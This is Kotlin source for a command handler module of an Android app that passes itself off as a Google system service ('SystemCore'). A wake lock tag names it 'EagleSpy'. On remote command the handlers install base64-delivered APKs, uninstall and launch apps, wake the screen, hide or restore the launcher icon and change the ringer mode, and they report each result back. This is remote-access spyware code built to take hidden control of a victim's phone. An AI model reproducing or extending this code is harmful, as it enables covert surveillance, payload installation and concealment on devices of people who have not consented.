package com.google.android.systemservice.handlers

import android.app.KeyguardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.content.FileProvider
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import java.io.File

class DeviceControlHandlers(private val ctx: CommandContext) {

    companion object {
        private const val TAG = "SystemCore"
    }

    private fun sendError(message: String) {
        ctx.sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    fun executeInstallApk(params: JSONObject?) {
        val apkBase64 = params?.optString("apk_base64") ?: return sendError("Missing apk_base64")

        ctx.scope.launch {
            try {
                val apkBytes = Base64.decode(apkBase64, Base64.DEFAULT)
                val cacheDir = ctx.appContext.externalCacheDir
                val apkFile = File(cacheDir, "install_${System.currentTimeMillis()}.apk")
                apkFile.writeBytes(apkBytes)

                val intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(
                        FileProvider.getUriForFile(ctx.appContext, "${ctx.appContext.packageName}.fileprovider", apkFile),
                        "application/vnd.android.package-archive"
                    )
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                }
                ctx.appContext.startActivity(intent)

                ctx.sendResponse("apk_install", JSONObject().apply {
                    put("status", "installation_started")
                })
            } catch (e: Exception) {
                sendError("Install APK error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeUninstallApp(params: JSONObject?) {
        val packageName = params?.optString("package_name") ?: return sendError("Missing package_name")

        ctx.scope.launch {
            try {
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                ctx.appContext.startActivity(intent)
                ctx.sendResponse("app_uninstall", JSONObject().apply {
                    put("status", "uninstall_started")
                    put("package", packageName)
                })
            } catch (e: Exception) {
                sendError("Uninstall app error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeLaunchApp(params: JSONObject?) {
        val packageName = params?.optString("package_name") ?: return sendError("Missing package_name")

        ctx.scope.launch {
            try {
                val intent = ctx.appContext.packageManager.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    ctx.appContext.startActivity(intent)
                    ctx.sendResponse("app_launched", JSONObject().apply {
                        put("status", "success")
                        put("package", packageName)
                    })
                } else {
                    sendError("App not found: $packageName")
                }
            } catch (e: Exception) {
                sendError("Launch app error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeUnlockScreen() {
        ctx.scope.launch {
            var wakeLock: PowerManager.WakeLock? = null
            try {
                val keyguardManager = ctx.appContext.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: return@launch
                val powerManager = ctx.appContext.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return@launch

                wakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "EagleSpy:UnlockWakeLock"
                )
                wakeLock.acquire(10_000)

                ctx.sendResponse("screen_unlocked", JSONObject().apply {
                    put("status", "screen_on")
                    put("is_locked", keyguardManager.isKeyguardLocked)
                })
            } catch (e: Exception) {
                sendError("Unlock screen error: ${(e.message ?: "Unknown error")}")
            } finally {
                if (wakeLock?.isHeld == true) wakeLock.release()
            }
        }
    }

    fun executeHideIcon() {
        ctx.scope.launch {
            try {
                withTimeout(5000) {
                    val componentName = ComponentName(ctx.appContext, "${ctx.appContext.packageName}.SetupWizardActivity")
                    ctx.appContext.packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    ctx.sendResponse("icon_hidden", JSONObject().apply {
                        put("status", "hidden")
                    })
                }
            } catch (e: Exception) {
                sendError("Hide icon error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeShowIcon() {
        ctx.scope.launch {
            try {
                withTimeout(5000) {
                    val componentName = ComponentName(ctx.appContext, "${ctx.appContext.packageName}.SetupWizardActivity")
                    ctx.appContext.packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    ctx.sendResponse("icon_shown", JSONObject().apply {
                        put("status", "visible")
                    })
                }
            } catch (e: Exception) {
                sendError("Show icon error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeChangeAudioMode(params: JSONObject?) {
        val mode = params?.optString("mode") ?: return sendError("Missing mode")

        ctx.scope.launch {
            try {
                withTimeout(3000) {
                    val audioManager = ctx.appContext.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return@withTimeout
                    val audioMode = when (mode.lowercase()) {
                        "normal" -> AudioManager.MODE_NORMAL
                        "silent" -> AudioManager.RINGER_MODE_SILENT
                        "vibrate" -> AudioManager.RINGER_MODE_VIBRATE
                        else -> AudioManager.MODE_NORMAL
                    }

                    if (mode.lowercase() == "silent" || mode.lowercase() == "vibrate") {
                        audioManager.ringerMode = audioMode
                    } else {
                        audioManager.mode = audioMode
                    }

                    ctx.sendResponse("audio_mode_changed", JSONObject().apply {
                        put("status", "success")
                        put("mode", mode)
                    })
                }
            } catch (e: Exception) {
                sendError("Change audio mode error: ${(e.message ?: "Unknown error")}")
            }
        }
    }
}
